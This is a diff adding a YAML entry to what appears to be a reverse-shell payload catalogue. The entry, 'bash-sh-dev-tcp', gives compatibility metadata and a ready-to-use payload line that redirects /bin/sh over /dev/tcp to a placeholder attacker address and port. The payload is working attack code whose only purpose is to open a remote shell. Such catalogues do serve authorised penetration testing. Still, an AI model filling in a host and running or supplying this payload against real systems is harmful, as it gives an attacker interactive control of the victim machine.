@@ -1,0 +1,36 @@
+---
+
+###
+### Meta definitions
+###
+specification:
+  payload: code
+  type: revshell
+  version: 0.0.1
+
+
+###
+### Items
+###
+items:
+
+  - name: bash-sh-dev-tcp
+    desc: description
+    info:
+      - BSD don't have bash installed by default
+      - Solaris doesn't have bash installed by default
+    rating: 1
+    code:
+      language: bash
+      requires:
+        version: []                             # Works on any version of bash
+        commands: ["sh"]                        # Will execute sh
+        functions: []                           # No functions used
+        modules: []                             # No modules used
+        os: ["bsd", "linux", "mac", "solaris"]  # Works on *nix only (due to/bin/sh)
+    revshell:
+      proto: tcp
+      shell: sh
+      command: "/bin/sh"
+    payload: |
+      /bin/sh>&/dev/tcp/__ADDR__/__PORT__ 0>&1
